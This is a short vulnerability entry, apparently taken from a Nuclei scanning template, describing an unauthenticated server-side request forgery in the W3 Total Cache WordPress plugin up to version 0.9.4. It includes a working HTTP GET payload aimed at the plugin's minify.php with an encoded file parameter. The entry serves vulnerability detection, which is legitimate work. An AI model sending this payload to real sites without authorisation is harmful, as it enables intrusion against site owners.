# Vulnerability: Wordpress W3C Total Cache <= 0.9.4 - Server Side Request Forgery (SSRF)
**Classification:** WORDPRESS
**Source:** Nuclei Template (`w3c-total-cache-ssrf.yaml`)

## Description
The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css
```

